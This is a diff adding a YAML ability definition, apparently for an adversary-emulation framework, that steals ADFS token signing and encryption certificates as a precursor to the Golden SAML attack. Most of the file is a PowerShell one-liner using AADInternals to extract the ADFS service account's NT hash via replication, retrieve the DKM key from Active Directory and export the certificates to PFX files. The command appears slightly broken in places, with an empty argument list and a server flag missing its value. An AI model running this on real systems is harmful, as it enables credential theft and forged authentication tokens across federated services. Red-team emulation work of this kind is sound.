@@ -1,0 +1,44 @@
+---
+- id: 745d16045bcf10379b8cf2fa45f2b66e
+  name: ADFS token signing and encryption certificates theft - Remote
+  description: 'Retrieve ADFS token signing and encrypting certificates. This is a
+    precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain
+    Administrators user on a domain-joined computer.
+
+    Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    windows:
+      psh:
+        command: Import-Module ActiveDirectory -Force ; Import-Module AADInternals
+          -Force | Out-Null; $dcServerName = (Get-ADDomainController).HostName; $svc
+          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
+          name -eq "#{adfs_service_account_name}"; $PWord = ConvertTo-SecureString
+          -String "#{replication_password}" -AsPlainText -Force; $Credential = New-Object
+          -TypeName System.Management.Automation.PSCredential -ArgumentList; $hash
+          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
+          -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration
+          -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig;
+          $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group;
+          $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName;
+          $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn;
+          $base = "LDAP://CN=$group,$container,$parent"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base));
+          $ADSearch.Filter = '(name=CryptoPolicy)'; $ADSearch.PropertiesToLoad.Clear();
+          $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null; $aduser = $ADSearch.FindOne();
+          $keyObjectGuid = $ADUser.Properties["displayName"] ; $ADSearch.PropertiesToLoad.Clear();
+          $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null; $ADSearch.Filter="(l=$keyObjectGuid)";
+          $aduser=$ADSearch.FindOne() ; $key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
+          ; Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; Get-ChildItem
+          | Where-Object {$_ -like "ADFS*"}; Write-Host "`nCertificates retrieved
+          successfully"
+        payloads: []
+        cleanup: Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore; Remove-Item
+          -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
